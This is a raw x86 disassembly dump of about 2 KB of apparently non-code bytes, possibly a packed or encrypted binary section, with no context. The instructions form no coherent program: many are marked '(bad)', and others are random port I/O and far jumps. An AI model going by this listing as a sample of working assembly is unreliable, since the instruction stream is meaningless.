  4123a5:	shl    dh,1
  4123a7:	pop    edx
  4123a8:	sahf   
  4123a9:	adc    eax,0x8497297f
  4123ae:	pop    ds
  4123af:	ss in  al,dx
  4123b1:	mov    ebx,0xdcc919c9
  4123b6:	sub    eax,0xa9694ff5
  4123bb:	mov    esp,0x9dfd9ba6
  4123c0:	aas    
  4123c1:	ja     0x412386
  4123c3:	adc    al,0xcd
  4123c5:	sub    DWORD PTR [eax],0xffffff9b
  4123c8:	icebp  
  4123c9:	xchg   DWORD PTR [ebx],edx
  4123cb:	push   edx
  4123cc:	or     DWORD PTR [edx],ebp
  4123ce:	mov    ah,0x62
  4123d0:	mov    dh,0x68
  4123d2:	mov    ecx,0x83162b03
  4123d7:	loope  0x4123e9
  4123d9:	sbb    eax,0xd88ef26c
  4123de:	xchg   ebx,eax
  4123df:	dec    ebp
  4123e0:	mov    ah,0xae
  4123e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123e3:	pop    DWORD PTR ds:0x286208ef
  4123e9:	test   al,0x90
  4123eb:	mov    eax,ds:0x757b7069
  4123f0:	aad    0x1c
  4123f2:	cmp    BYTE PTR [ebx-0x74fd7705],bh
  4123f8:	adc    DWORD PTR [ebp+eiz*2-0x75657473],ecx
  4123ff:	add    ebp,DWORD PTR [ebp-0x54bb4ca]
  412405:	lods   al,BYTE PTR ds:[esi]
  412406:	lock fdiv QWORD PTR [ebx-0x6]
  41240b:	xchg   edi,eax
  41240c:	je     0x412404
  41240e:	mov    DWORD PTR [ebx-0x15977d10],ebp
  412414:	dec    ebx
  412415:	sub    eax,0x62b8981f
  41241a:	cdq    
  41241b:	shl    DWORD PTR [ecx-0x68],1
  41241e:	inc    esp
  41241f:	adc    DWORD PTR [edx],esp
  412421:	jbe    0x41245d
  412423:	jae    0x4123da
  412425:	scas   al,BYTE PTR es:[edi]
  412426:	push   0xffffffa5
  412428:	inc    esi
  412429:	(bad)  
  41242a:	xchg   edx,eax
  41242b:	mov    bl,0x25
  41242d:	xor    edx,ebp
  41242f:	aas    
  412430:	mov    esp,eax
  412432:	pop    edx
  412433:	xor    DWORD PTR [edx+0x774b2e7a],0x5
  41243a:	(bad)  
  41243b:	(bad)  
  41243c:	fsub   st(2),st
  41243e:	and    al,al
  412440:	cmp    esp,eax
  412442:	mov    eax,ds:0x211021ab
  412447:	je     0x41246b
  412449:	out    dx,eax
  41244a:	imul   edi,DWORD PTR [edx],0x7a353d49
  412450:	popa   
  412451:	pop    es
  412452:	sbb    dl,BYTE PTR [eax+0x5c4fdd0f]
  412458:	push   ds
  412459:	mov    dh,0xdd
  41245b:	fwait
  41245c:	sub    bl,BYTE PTR [ecx-0x53]
  41245f:	out    0x7a,eax
  412461:	pop    ecx
  412462:	fsub   DWORD PTR [edi+edx*4]
  412465:	jnp    0x41246e
  412467:	addr16 in eax,0x1f
  41246a:	xor    eax,eax
  41246c:	sahf   
  41246d:	dec    edi
  41246e:	or     edi,DWORD PTR [ebp-0x71050de3]
  412474:	jns    0x4123fe
  412476:	out    dx,eax
  412477:	test   DWORD PTR [ebx+0x3],ebp
  41247a:	stos   DWORD PTR es:[edi],eax
  41247b:	dec    edx
  41247c:	aad    0xa9
  41247e:	add    eax,0x37f921b3
  412483:	dec    eax
  412484:	not    ch
  412486:	outs   dx,DWORD PTR ds:[esi]
  412487:	sar    DWORD PTR [edx-0x27],0x6e
  41248b:	or     al,0x8
  41248d:	mov    ds:0x97734748,al
  412492:	in     eax,dx
  412493:	out    dx,al
  412494:	adc    al,bh
  412496:	cli    
  412497:	and    esi,esi
  412499:	jg     0x4124cf
  41249b:	xchg   bl,bh
  41249d:	xchg   ebx,eax
  41249e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41249f:	stos   DWORD PTR es:[edi],eax
  4124a0:	pop    DWORD PTR [edx-0x3]
  4124a3:	or     DWORD PTR ds:0x79dac7e2,eax
  4124a9:	inc    DWORD PTR [ecx+0x12]
  4124ac:	mov    al,ds:0x1d99057d
  4124b1:	or     eax,ebx
  4124b3:	inc    ecx
  4124b4:	pop    ss
  4124b5:	cmp    eax,0x947d7404
  4124ba:	pusha  
  4124bb:	fist   DWORD PTR gs:[ebx-0x39]
  4124bf:	in     al,dx
  4124c0:	pop    ebx
  4124c1:	bound  esi,QWORD PTR [ebp-0x4a18638d]
  4124c7:	lds    esi,FWORD PTR [ebx]
  4124c9:	mov    ebp,0x3498ac5c
  4124ce:	test   DWORD PTR [eax+0x54],0x841da346
  4124d5:	mov    eax,0x9ecbdd1
  4124db:	ja     0x412523
  4124dd:	jle    0x412534
  4124df:	add    eax,0x41d0384
  4124e4:	jo     0x412544
  4124e6:	mov    BYTE PTR [ebx-0x689e1295],bl
  4124ec:	outs   dx,DWORD PTR ds:[esi]
  4124ed:	das    
  4124ee:	fmul   DWORD PTR [edx-0x70316839]
  4124f4:	add    al,0x7f
  4124f6:	(bad)
  4124f9:	out    0x98,al
  4124fb:	lock xor ecx,esp
  4124fe:	adc    BYTE PTR [eax+0x1b],al
  412501:	aaa    
  412502:	loopne 0x41248d
  412504:	test   BYTE PTR ds:0xd18cf2f7,al
  41250a:	mov    esi,0xc288d153
  41250f:	inc    BYTE PTR [ecx-0xa5d5b66]
  412515:	call   DWORD PTR [edi+eax*1]
  412518:	xlat   BYTE PTR ds:[ebx]
  412519:	enter  0xf651,0xee
  41251d:	add    eax,0xc8f20529
  412522:	ret    
  412523:	fdivr  QWORD PTR [edx]
  412525:	aam    0xbe
  412527:	data16 daa 
  412529:	mov    dl,0xdc
  41252b:	adc    DWORD PTR [ebx],ebp
  41252d:	jp     0x412532
  41252f:	imul   edi,DWORD PTR [eax+0x11],0x79fe117b
  412536:	jle    0x4124f2
  412538:	mov    ecx,DWORD PTR [edi]
  41253a:	xor    al,0x93
  41253c:	xchg   al,cl
  41253e:	mov    bl,0x28
  412540:	add    ebx,edx
  412542:	gs icebp 
  412544:	aad    0xb3
  412546:	stos   BYTE PTR es:[edi],al
  412547:	ds stc 
  412549:	lahf   
  41254a:	daa    
  41254b:	dec    ebx
  41254c:	bt     esi,ebx
  41254f:	out    0x9,eax
  412551:	jp     0x4125bc
  412553:	(bad)  
  412554:	pop    ebx
  412555:	dec    esi
  412556:	push   ecx
  412557:	lea    esp,[ebp-0x16]
  41255a:	adc    ebx,DWORD PTR [eax]
  41255c:	pushf  
  41255d:	adc    BYTE PTR [ebx+0x1d],bl
  412560:	fstp   QWORD PTR [ebp+0x1e487181]
  412566:	pop    es
  412567:	pop    edx
  412568:	mov    bh,0xdd
  41256a:	bound  esp,QWORD PTR [ebx-0x3d]
  41256d:	jecxz  0x412558
  41256f:	nop
  412570:	lahf   
  412571:	pop    ecx
  412572:	fmul   st,st(3)
  412574:	imul   edi,DWORD PTR [eax-0x5a],0x4d552337
  41257b:	push   es
  41257c:	fcomp  QWORD PTR [eax+0x3f0cea71]
  412582:	test   eax,0x71fd57db
  412587:	sbb    eax,0x902bc8e
  41258c:	add    ecx,DWORD PTR [edi]
  41258e:	jecxz  0x41257d
  412590:	add    ch,BYTE PTR [edi-0x71bc7224]
  412596:	test   eax,0xf7df80ec
  41259b:	nop
  41259c:	fcomp  st(3)
  41259e:	mov    ebx,0xeff67ca0
  4125a3:	das    
  4125a4:	js     0x4125b5
  4125a6:	cmp    eax,0xa6b1cd0a
  4125ab:	mov    ecx,0x2a73821a
  4125b0:	add    eax,0x9e1e9dd4
  4125b5:	out    0x4d,al
  4125b7:	(bad)
  4125ba:	mov    al,0xca
  4125bc:	loopne 0x4125b7
  4125be:	push   es
  4125bf:	jmp    0xd360:0x742502b6
  4125c6:	lea    ebx,[eax]
  4125c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125c9:	outs   dx,DWORD PTR ds:[esi]
  4125ca:	test   ecx,ecx
  4125cc:	pop    edx
  4125cd:	sbb    BYTE PTR [ebp-0x49],bh
  4125d0:	cmc    
  4125d1:	stos   DWORD PTR es:[edi],eax
  4125d2:	gs jmp 0x412572
  4125d5:	xchg   ecx,eax
  4125d6:	lock loop 0x41262e
  4125d9:	scas   al,BYTE PTR es:[edi]
  4125da:	or     al,BYTE PTR [ebp+0x145d6cdb]
  4125e0:	mov    ds,WORD PTR [ebx+0x71]
  4125e3:	inc    esp
  4125e4:	retf   
  4125e5:	shl    BYTE PTR [ecx],1
  4125e7:	pop    esi
  4125e8:	adc    ecx,DWORD PTR ds:0x81104efc
  4125ee:	sbb    BYTE PTR [edx+0x2d],bh
  4125f1:	and    bh,BYTE PTR [edi]
  4125f3:	les    ebp,FWORD PTR [ebx+0x43]
  4125f6:	xlat   BYTE PTR ds:[ebx]
  4125f7:	fwait
  4125f8:	jecxz  0x412648
  4125fa:	push   ds
  4125fb:	retf   
  4125fc:	sbb    cl,BYTE PTR [edx]
  4125fe:	jg     0x4125a4
  412600:	pop    edi
  412601:	or     dl,bh
  412603:	and    DWORD PTR [ecx+0x7a7af9d4],ebp
  412609:	fsub   QWORD PTR [ecx]
  41260b:	call   0x56f1:0x4d2c6ba
  412612:	xchg   esp,eax
  412613:	sbb    ecx,edi
  412615:	push   0xfffffff5
  412617:	les    edi,FWORD PTR [ebp-0x4b]
  41261a:	jmp    0xf770:0x1ffd5d06
  412621:	and    eax,edx
  412623:	jl     0x4125f3
  412625:	mov    edi,0x196deca5
  41262a:	mov    ch,0x3c
  41262c:	mov    dl,0xd2
  41262e:	aad    0x44
  412630:	pop    ds
  412631:	mov    al,ds:0x8486bc33
  412636:	dec    edi
  412637:	pop    eax
  412638:	xor    al,0xa0
  41263a:	jns    0x41261e
  41263c:	adc    edi,edx
  41263e:	(bad)  
  41263f:	adc    bl,dh
  412641:	scas   eax,DWORD PTR es:[edi]
  412642:	xchg   ebx,eax
  412643:	loop   0x4126a9
  412645:	add    DWORD PTR [edx+edi*8+0x52],eax
  412649:	int    0x32
  41264b:	(bad)  
  41264c:	push   eax
  41264d:	sti    
  41264e:	pop    es
  41264f:	cs jo  0x4126b2
  412652:	sbb    al,0xaa
  412654:	sub    eax,0xe0b1bea2
  412659:	iret   
  41265a:	outs   dx,BYTE PTR fs:[esi]
  41265c:	xchg   ebp,eax
  41265d:	fisub  WORD PTR [ebx]
  41265f:	arpl   WORD PTR [eax],bx
  412661:	adc    ebp,edi
  412663:	sbb    al,0xf
  412665:	test   BYTE PTR [ebx-0x73],bh
  412668:	test   eax,0x8211e6f7
  41266d:	mov    esi,0x556373b
  412672:	fcomp  DWORD PTR es:[ebx]
  412675:	(bad)  
  412676:	(bad)  
  412677:	fs sti 
  412679:	xor    al,0x50
  41267b:	push   cs
  41267c:	pop    es
  41267d:	mov    bl,0xa1
  41267f:	sub    BYTE PTR [ecx-0x38e44261],ah
  412685:	mov    ds:0x258354fd,eax
  41268a:	inc    ebp
  41268b:	inc    ebp
  41268c:	jecxz  0x412694
  41268e:	sbb    eax,0x979533dc
  412693:	pop    esp
  412694:	or     edx,esp
  412696:	je     0x4126ad
  412698:	ss stos BYTE PTR es:[edi],al
  41269a:	jns    0x412638
  41269c:	arpl   si,cx
  41269e:	fs (bad) 
  4126a0:	sar    DWORD PTR [eax-0x50351df4],1
  4126a6:	(bad)  
  4126a7:	sahf   
  4126a8:	aaa    
  4126a9:	ins    BYTE PTR es:[edi],dx
  4126aa:	lds    edx,FWORD PTR [ebp+0x64cd7548]
  4126b0:	add    BYTE PTR [eax+0x5b],0x52
  4126b4:	retf   
  4126b5:	cmp    eax,0xd30ee0e4
  4126ba:	lods   al,BYTE PTR ds:[esi]
  4126bb:	aas    
  4126bc:	into   
  4126bd:	in     eax,0x22
  4126bf:	or     BYTE PTR [esi],0xaf
  4126c2:	sbb    edx,DWORD PTR [ebx]
  4126c4:	mov    esp,0x24db678c
  4126c9:	push   0xf13d44af
  4126ce:	ins    BYTE PTR es:[edi],dx
  4126cf:	fiadd  DWORD PTR ds:0xf40349a8
  4126d5:	dec    edi
  4126d6:	repz mov al,ds:0x5965af23
  4126dc:	cmp    DWORD PTR [edi-0x4],0x9328bb7
  4126e3:	dec    edi
  4126e4:	pop    edx
  4126e5:	stc    
  4126e6:	xor    al,0xa5
  4126e8:	mov    edi,0xf89b5ea7
  4126ed:	xlat   BYTE PTR ds:[ebx]
  4126ee:	push   0xffffffea
  4126f0:	test   BYTE PTR [esi+0x6e06f24e],dh
  4126f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126f7:	mov    WORD PTR [edx],cs
  4126f9:	push   edx
  4126fa:	fwait
  4126fb:	inc    ecx
  4126fc:	pop    edx
  4126fd:	xchg   esp,eax
  4126fe:	push   0x7a615097
  412703:	sub    bl,BYTE PTR [eax]
  412705:	mov    gs:0x28826c2e,eax
  41270b:	pop    edi
  41270c:	pop    ebx
  41270d:	mov    al,cs:0x435d51aa
  412713:	inc    eax
  412714:	xchg   esp,eax
  412715:	imul   edi,edi,0xffffff9f
  412718:	hlt    
  412719:	mov    eax,ds:0x74c2648
  41271e:	test   eax,esi
  412720:	pop    ecx
  412721:	or     eax,0x900bc822
  412726:	push   0xfffffff6
  412728:	fchs   
  41272a:	out    dx,eax
  41272b:	popa   
  41272c:	sar    ebp,1
  41272e:	cwde   
  41272f:	imul   esi,DWORD PTR [edx+ecx*2-0x6c23a216],0x7608f192
  41273a:	push   ds
  41273b:	loope  0x412727
  41273d:	add    BYTE PTR [ebx+0x6b05902c],ah
  412743:	(bad)  
  412744:	xor    dl,ch
  412746:	mov    ds:0x5142382d,al
  41274b:	pop    eax
  41274c:	(bad)  
  41274e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41274f:	dec    ebp
  412750:	stos   DWORD PTR es:[edi],eax
  412751:	mov    ds:0x43ce66a5,eax
  412756:	repz inc ecx
  412758:	dec    edi
  412759:	repnz mov cs,WORD PTR [edx+esi*1-0x2e8d7683]
  412761:	sbb    eax,0xce20219
  412766:	mov    ecx,edx
  412768:	or     ch,BYTE PTR [ecx+0x53]
  41276b:	(bad)  
  41276c:	push   ebp
  41276d:	jns    0x41279f
  41276f:	inc    ebp
  412770:	cs mov esi,0x5a5fbd51
  412776:	clc    
  412777:	mov    eax,ds:0x9ae54f38
  41277c:	add    bl,cl
  41277e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41277f:	stos   DWORD PTR es:[edi],eax
  412780:	mov    dh,dl
  412782:	in     al,0xd2
  412784:	rol    BYTE PTR [edi+0x4bfe2f70],cl
  41278a:	movntq QWORD PTR [ecx],mm4
  41278d:	xchg   edi,eax
  41278e:	adc    BYTE PTR [ebx-0x4d2e0b7e],al
  412794:	not    BYTE PTR [ecx+0x53]
  412797:	icebp  
  412798:	mov    WORD PTR [edx+0x3a10d86a],fs
  41279e:	push   cs
  41279f:	push   ss
  4127a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127a1:	outs   dx,BYTE PTR ds:[esi]
  4127a2:	dec    BYTE PTR [esi+0x5e]
  4127a5:	daa    
  4127a6:	ss cmp al,0xe2
  4127a9:	ja     0x41273c
  4127ab:	iret   
  4127ac:	mov    gs,WORD PTR [ebp-0x4a]
  4127af:	push   ds
  4127b0:	jmp    0x2b88:0x2262fdd5
  4127b7:	cli    
  4127b8:	sbb    BYTE PTR [edx],ah
  4127ba:	cli    
  4127bb:	call   0x8bd5fcb0
  4127c0:	mov    ds:0xe443740a,eax
  4127c5:	and    edx,DWORD PTR [ecx+0x21b216fd]
  4127cb:	adc    BYTE PTR [eax-0x57],0xf5
  4127cf:	add    al,0x80
  4127d1:	push   esp
  4127d2:	fisttp WORD PTR [esi+0xe95e165]
  4127d8:	sub    edx,DWORD PTR [eax]
  4127da:	mov    esp,0x5dad19a8
  4127df:	leave  
  4127e0:	push   0x4fef1602
  4127e5:	imul   DWORD PTR [ebp+ebx*4-0x35]
  4127e9:	cmp    bh,BYTE PTR [eax-0x9]
  4127ec:	cmp    BYTE PTR [edx],bh
  4127ee:	inc    edx
  4127ef:	adc    eax,0xbe770f8a
  4127f4:	in     al,dx
  4127f5:	mov    WORD PTR [ebx],fs
  4127f7:	lea    ebp,[eax-0x5d]
  4127fa:	xor    DWORD PTR [ebx+0x29],0xffffffa9
  4127fe:	add    eax,0xe987f5cf
  412803:	push   ds
  412804:	add    eax,0x1f74d8f3
  412809:	fnsave [ecx+0x6e]
  41280c:	int3   
  41280d:	dec    ebp
  41280e:	loope  0x4127ff
  412810:	es (bad) 
  412813:	stos   BYTE PTR es:[edi],al
  412814:	sti    
  412815:	sub    dl,BYTE PTR [ecx+ebx*2+0x3386cce1]
  41281c:	dec    ecx
  41281d:	cmp    DWORD PTR [eax],edx
  41281f:	jb     0x412860
  412821:	mov    ds:0x2de66e05,al
  412826:	xchg   ebp,eax
  412827:	jecxz  0x4127cd
  412829:	popa   
  41282a:	imul   esi,DWORD PTR [ecx+0x614ac4f1],0xffffffce
  412831:	repnz push ds
  412833:	jg     0x4128a4
  412835:	jb     0x41280f
  412837:	fimul  WORD PTR [ebp+0x1e]
  41283a:	cmp    DWORD PTR [esi-0x62],ebx
  41283d:	mov    al,ds:0xa8c83f1e
  412842:	and    al,0xf1
  412844:	jp     0x4127fc
  412846:	aam    0x2b
  412848:	push   eax
  412849:	jge    0x412830
  41284b:	lds    esi,FWORD PTR [edi+0x13ebc804]
  412851:	jae    0x4127d6
  412853:	fistp  QWORD PTR [esi+0x2b]
  412856:	mov    cl,0x76
  412858:	jbe    0x412807
  41285a:	mov    ecx,DWORD PTR [ebp-0xf1e7d15]
  412860:	hlt    
  412861:	sub    BYTE PTR [ebp-0x7a073988],bl
  412867:	inc    eax
  412868:	pop    ebp
  412869:	sbb    al,0x55
  41286b:	or     BYTE PTR [edx-0x21],dh
  41286e:	xchg   BYTE PTR [esi-0x6b],al
  412871:	sub    al,0xa3
  412873:	call   0x7c93:0x41b961ac
  41287a:	xlat   BYTE PTR ds:[ebx]
  41287b:	icebp  
  41287c:	jmp    ecx
  41287e:	push   0x2e
  412880:	dec    ecx
  412881:	into   
  412882:	bound  eax,QWORD PTR [edi+esi*2]
  412885:	je     0x4128e6
  412887:	dec    BYTE PTR [edx]
  412889:	cmp    al,0xa8
  41288b:	mov    ds:0xd4137561,eax
  412890:	jp     0x412904
  412892:	daa    
  412893:	mov    eax,ds:0x33bafa0d
  412898:	jnp    0x4128b3
  41289a:	jb     0x412903
  41289c:	gs leave 
  41289e:	sub    ah,BYTE PTR [ebx+esi*4]
  4128a1:	jnp    0x412825
  4128a3:	sub    cl,cl
  4128a5:	je     0x4128d9
  4128a7:	gs gs pop ebp
  4128aa:	fwait
  4128ab:	imul   ebx,esp,0x6c
  4128ae:	pop    eax
  4128af:	pop    esp
  4128b0:	ret    
  4128b1:	mov    BYTE PTR [edi+0x10000b88],dl
  4128b7:	repz mov ebx,0x72f3ae12
  4128bd:	adc    ebx,DWORD PTR [esi+edx*1]
  4128c0:	test   eax,0x3475c84b
  4128c5:	mov    dl,0x6d
  4128c7:	lds    eax,FWORD PTR [ebx+0x70be1498]
  4128cd:	mov    esi,0x4c639bd4
  4128d2:	jns    0x412948
  4128d4:	jno    0x412872
  4128d6:	mov    eax,0x27de2d06
  4128db:	xchg   esi,eax
  4128dc:	sbb    al,cl
  4128de:	pop    esp
  4128df:	xchg   edx,eax
  4128e0:	push   edi
  4128e1:	dec    edx
  4128e2:	data16 aam 0xb
  4128e5:	sbb    eax,0xc9471ba0
  4128ea:	retf   
  4128eb:	xchg   esp,eax
  4128ec:	loope  0x412893
  4128ee:	sub    BYTE PTR [ecx+0x58],bh
  4128f1:	mov    dl,0x56
  4128f3:	mov    DWORD PTR [edi-0x79],ecx
  4128f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128f7:	sar    esp,cl
  4128f9:	sub    eax,0xe13fdc38
  4128fe:	daa    
  4128ff:	rol    DWORD PTR [edi],1
  412901:	xchg   edx,eax
  412902:	and    DWORD PTR [esi-0x18],ebp
  412905:	in     al,0x39
  412907:	es mov dh,0x37
  41290a:	xchg   DWORD PTR [esi+eiz*2],eax
  41290d:	retf   0xe7b4
  412910:	ret    0x9154
  412913:	(bad)  
  412914:	js     0x4128a9
  412916:	cmp    BYTE PTR [edi-0x32],0x4e
  41291a:	push   ds
  41291b:	sub    al,0x9d
  41291d:	push   eax
  41291e:	sub    DWORD PTR [edx+0x4057fdda],ecx
  412924:	neg    BYTE PTR ds:0xd7dc7be9
  41292a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41292c:	popa   
  41292d:	jmp    0x33efa4fb
  412932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412933:	pop    ebp
  412934:	adc    eax,0xf679e63e
  412939:	cmp    ah,BYTE PTR [ebp-0x10]
  41293c:	adc    BYTE PTR [bx-0x6a],dh
  412940:	sti    
  412941:	xlat   BYTE PTR ds:[ebx]
  412942:	out    dx,eax
  412943:	cmp    eax,0x229cc64e
  412948:	les    edx,FWORD PTR [edi+0x3387021e]
  41294e:	fst    DWORD PTR [edx]
  412950:	and    dl,BYTE PTR [edx-0x77cea11d]
  412956:	push   esi
  412957:	jo     0x412928
  412959:	lods   al,BYTE PTR ds:[esi]
  41295a:	dec    esi
  41295b:	(bad)  
  41295c:	clc    
  41295d:	cmp    BYTE PTR [eax-0x999b935],cl
  412963:	xchg   esi,eax
  412964:	cmp    DWORD PTR [edx+0x5bae134b],0x1363e75d
  41296e:	inc    ebp
  41296f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412970:	xor    eax,0xda26418e
  412975:	retf   
  412976:	outs   dx,DWORD PTR ds:[esi]
  412977:	int3   
  412978:	scas   al,BYTE PTR es:[edi]
  412979:	pop    ebp
  41297a:	push   ebp
  41297b:	test   al,0xf
  41297d:	pusha  
  41297e:	(bad)
  412981:	dec    eax
  412982:	xchg   DWORD PTR [ebx],ecx
  412984:	sub    eax,0x13fd7606
  412989:	pushf  
  41298a:	pop    ss
  41298b:	in     al,0x7f
  41298d:	in     al,0x9f
  41298f:	arpl   ax,dx
  412991:	mov    DWORD PTR [eax],ecx
  412993:	out    dx,al
  412994:	cmp    eax,0xa6389251
  412999:	outs   dx,DWORD PTR ds:[esi]
  41299a:	cmp    al,0xd0
  41299c:	add    al,0xa0
  41299e:	je     0x4129c8
  4129a0:	dec    eax
  4129a1:	inc    esp
  4129a2:	ja     0x4129ad
  4129a4:	inc    edx
  4129a5:	add    al,0x13
  4129a7:	inc    edi
  4129a8:	xor    BYTE PTR [edi-0x18],dh
  4129ab:	xor    cl,cl
  4129ad:	pop    ecx
  4129ae:	in     al,dx
  4129af:	jae    0x4129d6
  4129b1:	mov    bh,BYTE PTR [esp+esi*1-0x5c3bbda3]
  4129b8:	(bad)  
  4129b9:	xchg   esi,eax
  4129ba:	test   DWORD PTR [ebx+0x56],esp
  4129bd:	sahf   
  4129be:	in     eax,dx
  4129bf:	retf   0x2f4
  4129c2:	sbb    al,BYTE PTR [esi-0x7b54a1f5]
  4129c8:	adc    DWORD PTR [ebp-0x30ee13fb],ecx
  4129ce:	xor    eax,0x2e7a03d3
  4129d3:	sbb    eax,0xab915c3f
  4129d8:	sbb    al,0x2b
  4129da:	add    al,0x12
  4129dc:	mov    ch,0x23
  4129de:	and    al,0xbd
  4129e0:	xchg   edx,esp
  4129e2:	fidivr WORD PTR [ecx]
  4129e4:	adc    esi,DWORD PTR [edi-0x68]
  4129e7:	add    eax,0x4c6d14b4
  4129ec:	mov    eax,0xaefd145f
  4129f1:	pop    ds
  4129f2:	retf   0xb6ad
  4129f5:	call   0xdcf0:0x9505f1a8
  4129fc:	es mov dh,0xc5
  4129ff:	fcomp  QWORD PTR [ebp+0x5dd6a8fe]
  412a05:	or     ch,BYTE PTR [ebp+0x44]
  412a08:	ror    BYTE PTR [edi+edi*1+0x6],1
  412a0c:	push   es
  412a0d:	dec    ebx
  412a0e:	in     eax,dx
  412a0f:	arpl   WORD PTR [ebx+ebx*2],si
  412a12:	lds    esi,FWORD PTR [ecx+0x4a0b74fe]
  412a18:	jmp    0x4129c1
  412a1a:	xchg   edx,eax
  412a1b:	sbb    esp,edi
  412a1d:	test   DWORD PTR [edi+0x15],0x205fd5ad
  412a24:	dec    eax
  412a25:	push   ebx
  412a26:	mov    ah,0x92
  412a28:	mov    ebx,0xba2ff0ec
  412a2d:	pop    ds
  412a2e:	pop    esp
  412a2f:	sbb    eax,0xeeec36c9
  412a34:	out    dx,al
  412a35:	and    eax,0xe038d16
  412a3a:	xchg   ebp,eax
  412a3b:	outs   dx,DWORD PTR ds:[esi]
  412a3c:	lods   al,BYTE PTR ds:[esi]
  412a3d:	add    DWORD PTR [esi],ebp
  412a3f:	xchg   esp,eax
  412a40:	cmp    esi,DWORD PTR [edi+edx*4+0xb]
  412a44:	cwde   
  412a45:	jmp    DWORD PTR [edi-0x61d5d4d8]
  412a4b:	push   es
  412a4c:	lahf   
  412a4d:	jle    0x412ab7
  412a4f:	fcom   DWORD PTR ss:[eax]
  412a52:	mov    bh,BYTE PTR ds:0x2c903dd3
  412a58:	sub    BYTE PTR [ebp+0x6c46aa40],al
  412a5e:	jge    0x412a12
  412a60:	sbb    al,0xb
  412a62:	and    dl,dh
  412a64:	adc    eax,0x6aa96f51
  412a69:	push   esp
  412a6a:	inc    esi
  412a6b:	ins    DWORD PTR es:[edi],dx
  412a6c:	ins    BYTE PTR es:[edi],dx
  412a6d:	jbe    0x412a7e
  412a6f:	dec    ecx
  412a70:	inc    ebx
  412a71:	sbb    al,0x14
  412a73:	xor    ch,BYTE PTR [edi+ebx*2]
  412a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a77:	rcr    BYTE PTR [eax+0x2e275a94],1
  412a7d:	jbe    0x412a2e
  412a7f:	jge    0x412a1e
  412a81:	ins    DWORD PTR es:[edi],dx
  412a82:	adc    ebx,esi
  412a84:	les    ebp,FWORD PTR [edx]
  412a86:	js     0x412afe
  412a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a89:	mov    eax,ds:0x3bcdfec7
  412a8e:	stc    
  412a8f:	fwait
  412a90:	mov    ah,0xc9
  412a92:	fistp  QWORD PTR [eax+ebx*8+0x24b4842d]
  412a99:	rol    BYTE PTR [esi+0x3e],0xb
  412a9d:	inc    esp
  412a9e:	iret   
  412a9f:	(bad)  
  412aa0:	lods   al,BYTE PTR ds:[esi]
  412aa1:	mov    ebx,0xf087adc4
  412aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa7:	mov    ds:0x7bdcbd3e,al
  412aac:	adc    bl,dh
  412aae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aaf:	mov    esp,0xe7fad730
  412ab4:	push   esi
  412ab5:	push   0xffffffae
  412ab7:	sar    BYTE PTR [edi+esi*1],1
  412aba:	jne    0x412a55
  412abc:	mov    dl,BYTE PTR [eax+ecx*1-0x3ca50663]
  412ac3:	mov    eax,ds:0xff6f39bb
  412ac8:	imul   esi,DWORD PTR [ecx],0x9273274b
  412ace:	out    0xce,al
  412ad0:	scas   eax,DWORD PTR es:[edi]
  412ad1:	lock (bad) 
  412ad3:	jmp    0x412aaf
  412ad5:	lahf   
  412ad6:	ror    DWORD PTR [esi+0x51],1
  412ad9:	(bad)  
  412ada:	fidiv  WORD PTR [ebx+0x40]
  412add:	clc    
  412ade:	xchg   ecx,esi
  412ae0:	ror    DWORD PTR [esi+edx*8-0x11],cl
  412ae4:	mov    ?,WORD PTR [eax+0x39]
  412ae7:	add    eax,0xf8e88102
  412aec:	dec    edi
  412aed:	cdq    
  412aee:	add    edx,esi
  412af0:	push   0x79
  412af2:	and    DWORD PTR [eax+0x63d05c7d],ebx
  412af8:	pushf  
  412af9:	lahf   
  412afa:	clc    
  412afb:	repnz mov WORD PTR [edx],ds
  412afe:	push   ax
  412b00:	sbb    dh,cl
  412b02:	adc    al,0x49
  412b04:	xor    dh,al
  412b06:	cmp    BYTE PTR [ebx-0x372ffc53],bh
  412b0c:	not    bh
  412b0e:	or     ah,BYTE PTR [edi+0x6f]
  412b11:	xor    BYTE PTR [edi+0x147ba0aa],ch
  412b17:	jl     0x412b79
  412b19:	fadd   DWORD PTR [edx-0x53]
  412b1c:	pop    edx
  412b1d:	xchg   edi,eax
  412b1e:	ret    
  412b1f:	cmp    WORD PTR [esi-0x6486570e],bx
  412b26:	sar    BYTE PTR [eax],cl
  412b28:	stc    
  412b29:	xchg   BYTE PTR [edi+0x7f24b0d7],bl
  412b2f:	push   ebx
  412b30:	(bad)  
  412b31:	push   0x38311b9b
  412b36:	outs   dx,DWORD PTR ds:[esi]
  412b37:	sbb    DWORD PTR [eax-0x21ccb903],edi
  412b3d:	push   0xbc9264ae
  412b42:	sar    BYTE PTR [ebp+0x64],1
  412b45:	push   cs
  412b46:	daa    
  412b47:	pop    ebx
  412b48:	test   esp,eax
  412b4a:	call   FWORD PTR [esi]
  412b4c:	cmova  ecx,esp
  412b4f:	aam    0xfc
  412b51:	aad    0x2a
  412b53:	cs sbb edx,ebx
  412b56:	test   DWORD PTR [esi],ecx
  412b58:	scas   al,BYTE PTR es:[edi]
  412b59:	push   ebp
  412b5a:	jb     0x412b13
  412b5c:	jmp    0x1bd5e967
  412b61:	dec    edx
  412b62:	push   ebx
  412b63:	mov    al,ds:0x98798815
  412b68:	dec    BYTE PTR [edi-0x2a]
  412b6b:	push   es
  412b6c:	retf   0x4091
  412b6f:	sub    bl,BYTE PTR ds:[eax+eiz*8]
  412b73:	push   DWORD PTR [ebp+edx*4+0x4b]
  412b77:	cdq    
  412b78:	(bad)  
  412b79:	int    0xd9
  412b7b:	in     eax,dx
